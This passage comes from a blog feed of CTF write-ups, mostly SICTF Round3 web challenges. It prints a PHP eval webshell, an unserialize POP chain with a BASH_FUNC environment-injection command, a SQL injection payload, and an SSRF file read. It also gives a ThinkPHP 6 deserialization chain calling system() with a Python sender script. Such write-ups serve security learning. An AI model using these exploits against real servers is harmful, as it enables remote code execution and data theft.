class="number">0</span>;i&lt;mlen;i++)</span><br><span class="line">&#123;    </span><br><span class="line">   m[i]=m[i]+k[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> enc[] = &#123;</span><br><span class="line">   <span class="number">80</span>,  <span class="number">66</span>,  <span class="number">56</span>,  <span class="number">77</span>,  <span class="number">76</span>,  <span class="number">84</span>, <span class="number">144</span>, <span class="number">111</span>, <span class="number">254</span>, <span class="number">111</span>, </span><br><span class="line">  <span class="number">188</span>, <span class="number">105</span>, <span class="number">185</span>,  <span class="number">34</span>, <span class="number">124</span>,  <span class="number">22</span>, <span class="number">143</span>,  <span class="number">68</span>,  <span class="number">56</span>,  <span class="number">74</span>, </span><br><span class="line">  <span class="number">239</span>,  <span class="number">55</span>,  <span class="number">67</span>, <span class="number">192</span>, <span class="number">162</span>, <span class="number">182</span>,  <span class="number">52</span>,  <span class="number">44</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> kkey[] = &#123; <span class="number">68</span>, <span class="number">74</span>, <span class="number">86</span>, <span class="number">68</span>, <span class="number">74</span>, <span class="number">86</span>&#125;;</span><br><span class="line"><span class="type">char</span> key[] = &#123;<span class="number">77</span>, <span class="number">78</span>, <span class="number">65</span>, <span class="number">112</span>, <span class="number">75</span>, <span class="number">74</span>, <span class="number">77</span>, <span class="number">90</span>, <span class="number">72</span>, <span class="number">14</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">key[i]^=<span class="number">0x2f</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">6</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">kkey[i]^=<span class="number">0x2f</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">RC4_encrypt</span>((<span class="type">unsigned</span> <span class="type">char</span> *)key,kkey,<span class="number">10</span>,<span class="number">6</span>);</span><br><span class="line"><span class="built_in">RC4_encrypt_new</span>(enc,key,<span class="number">28</span>,<span class="number">10</span>);</span><br><span class="line">cout &lt;&lt; enc;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// hgame&#123;I826-2e904t-4t98-9i82&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> MISC </tag>
            
            <tag> CRYPTO </tag>
            
            <tag> REVERSE </tag>
            
            <tag> hgame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SICTF Round3</title>
      <link href="/SICTF_Round3/"/>
      <url>/SICTF_Round3/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p>抢到5个一血，一个二血（</p><h2 id="100％-upload"><a href="#100％-upload" class="headerlink" title="100％_upload"></a>100％_upload</h2><p>观察url，有一个<code>?file=upload.php</code>，猜测这里可以文件包含。</p><p>接着是上传文件，过滤了<code>php</code>等关键字，文件名可以随意，上传成功后得到文件路径。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=eval($_POST[1])?&gt;</span><br></pre></td></tr></table></figure><p><img src="/./SICTF_Round3/w_1_1.png"></p><p><code>?file=uploads/123.php.png</code> 包含刚刚上传的文件，即可rce。</p><p><img src="/./SICTF_Round3/w_1_2.png"></p><h2 id="Not-just-unserialize"><a href="#Not-just-unserialize" class="headerlink" title="Not just unserialize"></a>Not just unserialize</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$welcome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">begin0fweb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">begin0fweb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$p</span>=<span class="string">&#x27;hacker!&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;welcome-&gt;you = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$year</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;  Welcome to new year!  &#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable language_">$this</span>-&gt;year);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CR</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$last</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newyear</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/worries/i&#x27;</span>,<span class="variable">$this</span>-&gt;newyear))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;empty it!&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(worries).*$/&#x27;</span>,<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Don\&#x27;t be worry&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Worries doesn\&#x27;t exists in the new year  &#x27;</span>;</span><br><span class="line">            <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;last-&gt;worries);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ET</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>] <span class="keyword">as</span> <span class="variable">$inject</span> =&gt; <span class="variable">$rce</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$inject&#125;</span>=<span class="subst">&#123;$rce&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo \&quot;Haven&#x27;t you get the secret?\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;go&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;go&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到<code>ET::__isset</code>可以环境变量注入rce。</p><p>先是pop链：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start::__destruct =&gt; SE::__set =&gt; CR::__tostring =&gt; ET::__isset</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$welcome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">begin0fweb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">begin0fweb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$p</span>=<span class="string">&#x27;hacker!&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;welcome-&gt;you = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$year</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;  Welcome to new year!  &#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable language_">$this</span>-&gt;year);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CR</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$last</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newyear</span>=<span class="string">&quot;\nworries&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__tostring&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/worries/i&#x27;</span>,<span class="variable">$this</span>-&gt;newyear))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;empty it!&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(worries).*$/&#x27;</span>,<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Don\&#x27;t be worry&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Worries doesn\&#x27;t exists in the new year  &#x27;</span>;</span><br><span class="line">            <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;last-&gt;worries);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ET</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>] <span class="keyword">as</span> <span class="variable">$inject</span> =&gt; <span class="variable">$rce</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$inject&#125;</span>=<span class="subst">&#123;$rce&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo \&quot;Haven&#x27;t you get the secret?\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">start</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;welcome=<span class="keyword">new</span> <span class="title function_ invoke__">SE</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;welcome-&gt;year = <span class="keyword">new</span> <span class="title function_ invoke__">CR</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;welcome-&gt;year-&gt;last = <span class="keyword">new</span> <span class="title function_ invoke__">ET</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo4OiIKd29ycmllcyI7fX1zOjM6InlvdSI7Tjt9</span></span><br></pre></td></tr></table></figure><p>接着是一些php的特性：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/worries/i&#x27;</span>,<span class="variable">$this</span>-&gt;newyear))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;empty it!&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(worries).*$/&#x27;</span>,<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Don\&#x27;t be worry&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Worries doesn\&#x27;t exists in the new year  &#x27;</span>;</span><br><span class="line"><span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;last-&gt;worries);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以用回车来满足正则的要求，即<code>\nworries</code>。</p><p>参考链接：<a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">preg_match绕过总结</a></p><p>最后是环境变量注入rce。</p><p>参考链接：<a href="http://tttang.com/archive/1450/">我是如何利用环境变量注入执行任意命令</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET: get[BASH_FUNC_echo%25%25]=()%20&#123;%20cat%20/f*;%20&#125;</span><br><span class="line">POST: go=Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo4OiIKd29ycmllcyI7fX1zOjM6InlvdSI7Tjt9</span><br></pre></td></tr></table></figure><p>得到flag。</p><p><img src="/./SICTF_Round3/w_2_1.png"></p><h2 id="hacker"><a href="#hacker" class="headerlink" title="hacker"></a>hacker</h2><p>查看源码可以得到提示</p><p><img src="/./SICTF_Round3/w_3_1.png"></p><p>过滤了<code>or</code>，查不了列名，用无列名注入</p><p>参考链接：<a href="https://blog.csdn.net/weixin_46330722/article/details/109605941">SQL注入之无列名注入</a></p><p>​<a href="https://blog.csdn.net/weixin_46330722/article/details/109531387">buu做题笔记——[网鼎杯 2020 朱雀组]phpweb&amp;[SWPU2019]Web1</a></p><p>前面的查表名库名这些操作可以不用做了，直接套现成的payload查<code>flag</code>表就行了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=flag&#x27;union/**/select/**/(select/**/group_concat(`2`)/**/from/**/(select/**/1,2/**/union/**/select*from/**/flag)n)%23</span><br></pre></td></tr></table></figure><p><img src="/./SICTF_Round3/w_3_2.png"></p><h2 id="EZ-SSRF"><a href="#EZ-SSRF" class="headerlink" title="EZ_SSRF"></a>EZ_SSRF</h2><p>用<code>file协议</code>读文件就行了，读<code>/var/www/html/flag.php</code>。（出题人骗我，说flag在<code>/flag</code>）</p><p><img src="/./SICTF_Round3/w_4_1.png"></p><p>base64解码得到flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;SICTF&#123;8ce2ea5d-82b5-4fe0-9d86-efe9a0df693a&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Oyst3rPHP"><a href="#Oyst3rPHP" class="headerlink" title="Oyst3rPHP"></a>Oyst3rPHP</h2><p>thinkphp6.0*的反序列化、<code>preg_match</code>和md5的特性。</p><p>首先访问<code>/www.zip</code>，得到源码，看源码的<code>Readme.md</code>知道这是tp6。</p><p>部分源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;RT，一个很简单的Web，给大家送一点分,再送三只生蚝，过年一起吃生蚝哈&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../Oyster.png&#x27;&quot;</span>.<span class="string">&quot;/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">base64_decode</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">        <span class="variable">$right</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;left&#x27;</span>];</span><br><span class="line">        <span class="variable">$left</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;right&#x27;</span>];</span><br><span class="line">        </span><br><span class="line"><span class="variable">$key</span> = (<span class="keyword">string</span>)@<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$right</span> !== <span class="variable">$left</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$right</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$left</span>))&#123;</span><br><span class="line">            </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Congratulations on getting your first oyster&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../Oyster1.png&#x27;&quot;</span>.<span class="string">&quot;/&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?THINKPHP/is&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Oysters don&#x27;t want you to eat&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$key</span>, <span class="string">&#x27;603THINKPHP&#x27;</span>) === <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;！！！Oysters don&#x27;t want you to eat！！！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;WOW！！！Congratulations on getting your second oyster&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../Oyster2.png&#x27;&quot;</span>.<span class="string">&quot;/&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="comment">//最后一个生蚝在根目录，而且里面有Flag？？？咋样去找到它呢？？？它的名字是什么？？？</span></span><br><span class="line"><span class="comment">//在源码的某处注释给出了提示，这就看你是不是真懂Oyst3rphp框架咯！！！</span></span><br><span class="line"><span class="comment">//小Tips：细狗函数┗|｀O′|┛ 嗷~~</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里先是md5弱比较，然后利用正则回溯最大次数上限绕过 <code>preg_match</code> ，最后是反序列化。</p><p>参考链接：<a href="https://blog.csdn.net/yourdawntown/article/details/120558237">利用正则回溯最大次数上限绕过preg_match</a></p><p>反序列化直接拿网上现成的pop链就行了。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">trait</span> <span class="title">Attribute</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$data</span> = [<span class="string">&quot;key&quot;</span>=&gt;<span class="string">&quot;cat /Oyst3333333r.php&quot;</span>]; <span class="comment">// 这里填上命令</span></span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&quot;key&quot;</span>=&gt;<span class="string">&quot;system&quot;</span>];</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$lazySave</span> = <span class="literal">true</span>;</span><br><span class="line">     <span class="keyword">protected</span> <span class="variable">$withEvent</span> = <span class="literal">false</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">true</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$force</span> = <span class="literal">true</span>;</span><br><span class="line">     <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span>=<span class="string">&quot;&quot;</span></span>)</span>&#123;</span><br><span class="line">         <span class="variable language_">$this</span>-&gt;name=<span class="variable">$obj</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"> <span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"> </span>&#123;&#125;</span><br><span class="line"> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Pivot</span>();</span><br><span class="line"> <span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="variable">$a</span>);</span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">// TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjc6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE4OiIAdGhpbmtcTW9kZWwAZm9yY2UiO2I6MTtzOjc6IgAqAG5hbWUiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo3OntzOjIxOiIAdGhpbmtcTW9kZWwAbGF6eVNhdmUiO2I6MTtzOjEyOiIAKgB3aXRoRXZlbnQiO2I6MDtzOjE5OiIAdGhpbmtcTW9kZWwAZXhpc3RzIjtiOjE7czoxODoiAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo3OiIAKgBuYW1lIjtzOjA6IiI7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319</span></span><br></pre></td></tr></table></figure><p>因为回溯次数上限默认是 100 万，因此用python写脚本发过去。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://yuanshen.life:37255/?left=240610708&amp;right=s878926199a&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;key&quot;</span>:<span class="string">&#x27;a&#x27;</span>*<span class="number">1000100</span>+<span class="string">&quot;603THINKPHP&quot;</span>,<span class="string">&quot;payload&quot;</span>:<span 